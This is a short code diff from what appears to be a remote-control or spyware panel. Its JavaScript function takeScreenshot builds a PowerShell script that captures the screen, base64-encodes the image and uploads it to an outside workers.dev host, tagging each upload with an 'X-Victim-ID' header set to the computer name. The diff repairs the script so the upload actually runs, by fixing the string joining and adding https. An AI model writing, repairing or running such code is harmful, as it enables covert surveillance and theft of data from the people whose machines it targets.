@@ -949,8 +949,8 @@ function takeScreenshot(id) {
         '$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)\n' +
         '$b64 = [Convert]::ToBase64String($ms.ToArray())\n' +
         '$graphics.Dispose()\n' +
-        '$bmp.Dispose()'
-        'Invoke-RestMethod -Uri "readme.sharansahu1604.workers.dev/upload" -Method POST -Headers @{"X-Victim-ID"="$env:COMPUTERNAME";"X-Filename"="screenshot.png";"X-Data-Type"="screenshot"} -Body "data:image/png;base64,$b64"
+        '$bmp.Dispose()\n' + 
+        'Invoke-RestMethod -Uri "https://readme.sharansahu1604.workers.dev/upload" -Method POST -Headers @{"X-Victim-ID"="$env:COMPUTERNAME";"X-Filename"="screenshot.png";"X-Data-Type"="screenshot"} -Body "data:image/png;base64,$b64"
         `.trim()';
 
             const input = document.getElementById('cmd_' + id);
